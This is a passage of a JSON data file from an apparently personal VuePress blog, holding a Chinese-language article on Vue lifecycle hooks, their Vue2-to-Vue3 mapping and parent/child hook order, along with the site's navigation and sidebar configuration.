          "slug": "父子组件生命周期顺序",
          "normalizedTitle": "父子组件生命周期顺序",
          "charIndex": 643
        },
        {
          "level": 3,
          "title": "初始、挂载阶段",
          "slug": "初始、挂载阶段",
          "normalizedTitle": "初始、挂载阶段",
          "charIndex": 658
        },
        {
          "level": 3,
          "title": "更新阶段",
          "slug": "更新阶段",
          "normalizedTitle": "更新阶段",
          "charIndex": 798
        },
        {
          "level": 3,
          "title": "销毁阶段",
          "slug": "销毁阶段",
          "normalizedTitle": "销毁阶段",
          "charIndex": 871
        }
      ],
      "headersStr": "每个钩子都做了什么 Vue3和Vue2比较 父子组件生命周期顺序 初始、挂载阶段 更新阶段 销毁阶段",
      "content": "# Vue生命周期\n\n\n# 每个钩子都做了什么\n\n * beforeCreate:创建实例之前执行，元素和数据都是undefined。\n * created:实例初始化完成后执行，可以访问数据或方法，不能操作DOM。可以做一些初始数据的获取，发送ajax。\n * beforeMount:挂载前执行，虚拟DOM创建完成，即将开始渲染。\n * Mounted:页面渲染完成后执行，可以对DOM进行操作。\n * beforeUpdate：数据发生更新时执行。此时vue实例中的数据是最新的，但是页面数据仍是旧值。\n * updated：数据发生更新导致的 DOM 重新渲染完成时执行。\n * beforeDestroy：实例销毁前执行。实例仍然可以使用，一般在这个时候清除定时器或者解除事件绑定等。\n * destroyed：实例销毁完成。\n\n\n# Vue3和Vue2比较\n\n * beforeCreate===>setup()\n * created =======> setup()\n * beforeMount ===> onBeforeMount\n * mounted =======> onMounted\n * beforeUpdate ===> onBeforeUpdate\n * updated =======>onUpdated\n * beforeDestroy ==> onBeforeUnmount\n * destroyed =====> onUnmounted\n\n\n# 父子组件生命周期顺序\n\n\n# 初始、挂载阶段\n\n父组件beforeCreate => 父组件created => 父组件beforeMount => 子组件beforeCreate => 子组件created => 子组件beforeMount => 子组件mounted => 父组件mounted\n\n\n# 更新阶段\n\n父组件beforeUpdate => 子组件beforeUpdate => 子组件updated => 父组件updated\n\n\n# 销毁阶段\n\n父组件beforeDestroy => 子组件beforeDestroy => 子组件destroyed => 父组件destroyed",
      "normalizedContent": "# vue生命周期\n\n\n# 每个钩子都做了什么\n\n * beforecreate:创建实例之前执行，元素和数据都是undefined。\n * created:实例初始化完成后执行，可以访问数据或方法，不能操作dom。可以做一些初始数据的获取，发送ajax。\n * beforemount:挂载前执行，虚拟dom创建完成，即将开始渲染。\n * mounted:页面渲染完成后执行，可以对dom进行操作。\n * beforeupdate：数据发生更新时执行。此时vue实例中的数据是最新的，但是页面数据仍是旧值。\n * updated：数据发生更新导致的 dom 重新渲染完成时执行。\n * beforedestroy：实例销毁前执行。实例仍然可以使用，一般在这个时候清除定时器或者解除事件绑定等。\n * destroyed：实例销毁完成。\n\n\n# vue3和vue2比较\n\n * beforecreate===>setup()\n * created =======> setup()\n * beforemount ===> onbeforemount\n * mounted =======> onmounted\n * beforeupdate ===> onbeforeupdate\n * updated =======>onupdated\n * beforedestroy ==> onbeforeunmount\n * destroyed =====> onunmounted\n\n\n# 父子组件生命周期顺序\n\n\n# 初始、挂载阶段\n\n父组件beforecreate => 父组件created => 父组件beforemount => 子组件beforecreate => 子组件created => 子组件beforemount => 子组件mounted => 父组件mounted\n\n\n# 更新阶段\n\n父组件beforeupdate => 子组件beforeupdate => 子组件updated => 父组件updated\n\n\n# 销毁阶段\n\n父组件beforedestroy => 子组件beforedestroy => 子组件destroyed => 父组件destroyed",
      "charsets": {
        "cjk": true
      }
    }
  ],
  "themeConfig": {
    "enableDarkMode": true,
    "repo": "https://github.com/HAOFUYANG/yang-blog",
    "nav": [
      {
        "text": "前端",
        "link": "/webstudy/"
      },
      {
        "text": "Javascript",
        "link": "/javascript/"
      },
      {
        "text": "数据结构",
        "link": "/dataStructure/"
      },
      {
        "text": "v1.0.2",
        "link": "/"
      }
    ],
    "sidebar": {
      "/webstudy/": [
        {
          "title": "Javascript",
          "children": [
            "/webstudy/Javascript/堆栈模型",
            "/webstudy/Javascript/原型和原型链",
            "/webstudy/Javascript/对象的创建与继承",
            "/webstudy/Javascript/作用域和闭包",
            "/webstudy/Javascript/内存泄漏和垃圾回收",
            "/webstudy/Javascript/同步和异步",
            "/webstudy/Javascript/JS严格模式"
          ]
        },
        {
          "title": "ES6及以上",
          "children": [
            "/webstudy/ES6及以上/箭头函数",
            "/webstudy/ES6及以上/reduce",
            "/webstudy/ES6及以上/for await of"
          ]
        },
        {
          "title": "HTML",
          "children": [
            "/webstudy/HTML/node和element",
            "/webstudy/HTML/defer和async"
          ]
        },
        {
          "title": "CSS",
          "children": [
            "/webstudy/CSS/flex",
            "/webstudy/CSS/文字超出省略",
            "/webstudy/CSS/零碎的知识",
            "/webstudy/CSS/Retina屏幕1px宽度"
          ]
        },
        {
          "title": "Vue2",
          "children": [
            "/webstudy/Vue2/特性",
            "/webstudy/Vue2/MVVM",
            "/webstudy/Vue2/Vue生命周期",
            "/webstudy/Vue2/Vue响应式原理",
            "/webstudy/Vue2/组件通讯",
            "/webstudy/Vue2/computed和watch",
            "/webstudy/Vue2/key",
            "/webstudy/Vue2/虚拟dom和diff算法",
            "/webstudy/Vue2/vue-router"
          ]
        },
        {
          "title": "Vue3",
          "children": [
            "/webstudy/Vue3/vue3相比于vue2",
            "/webstudy/Vue3/Proxy"
          ]
        },
        {
          "title": "TS",
          "children": [
            "/webstudy/TS/vue中ts的使用"
          ]
        },
        {
          "title": "运行环境",
          "children": [
            "/webstudy/运行环境/网页的加载和渲染",
            "/webstudy/运行环境/性能优化",
            "/webstudy/运行环境/安全"
          ]
        },
        {
          "title": "Experience",
          "children": [
            "/webstudy/Experience/首屏优化",
            "/webstudy/Experience/Vue优化"
          ]
        },
        {
          "title": "工程化",
          "children": [
            "/webstudy/工程化/前端工程化",
            "/webstudy/工程化/webpack-loader和plugin",
            "/webstudy/工程化/webpack 优化",
            "/webstudy/工程化/babel",
            "/webstudy/工程化/vue.config.js配置案例",
            "/webstudy/工程化/vite"
          ]
        },
        {
          "title": "HTTP",
          "children": [
            "/webstudy/HTTP/状态码",
            "/webstudy/HTTP/ajax-fetch-axios",
            "/webstudy/HTTP/Http协议1.0,1.1,2.0",
            "/webstudy/HTTP/token和cookie",
            "/webstudy/HTTP/TCP三次握手四次挥手",
            "/webstudy/HTTP/TCP和UDP",
            "/webstudy/HTTP/浏览器的缓存机制",
            "/webstudy/HTTP/网页多标签通讯",
            "/webstudy/HTTP/webSocket"
          ]
        },
        {
          "title": "Nodejs",
          "children": [
            "/webstudy/Nodejs/nodejs多进程",
            "/webstudy/Nodejs/中间件",
            "/webstudy/Nodejs/洋葱模型"
          ]
        },
        {
          "title": "项目",
          "children": [
            "/webstudy/项目/权限设计"
          ]
        },
        {
          "title": "设计模式",
          "children": [
            "/webstudy/设计模式/设计模式"
          ]
        }
      ],
      "/javascript/": [
        "/javascript/深拷贝",
        "/javascript/手写instanceof",
        "/javascript/手写call,bind,apply",
        "/javascript/手写new操作符",
        "/javascript/节流和防抖",
        "/javascript/手写promise",
        "/javascript/单例模式",
        "/javascript/Array去重扁平化",
        "/javascript/柯里化函数",
        "/javascript/手写Ajax",
        "/javascript/add(1)(2)(3)",
        "/javascript/for in和for of",
        "/javascript/for和forEach谁更快",
        "/javascript/手写getType",
        "/javascript/虚拟dom转化为真实dom",
        "/javascript/手写发布订阅"
      ],
      "/dataStructure/": [
        "/dataStructure/",
        {
          "title": "树简介",
          "children": [
            "/dataStructure/树简介/简介"
          ]
        },
        {
          "title": "二叉树",
          "children": [
            "/dataStructure/二叉树/前序遍历",
            "/dataStructure/二叉树/中序遍历",
            "/dataStructure/二叉树/后序遍历",
            "/dataStructure/二叉树/二叉树的宽度",
            "/dataStructure/二叉树/重建二叉树",
            "/dataStructure/二叉树/最小最大深度",
            "/dataStructure/二叉树/层序遍历"
          ]
        }
      ]
    },
    "codeSwitcher": {
      "groups": {
        "default": {
          "ts": "TypeScript",
          "js": "JavaScript"
        },
        "plugin-usage": {
          "tuple": "Tuple",
          "object": "Object"
        }
      }
    }
  }
}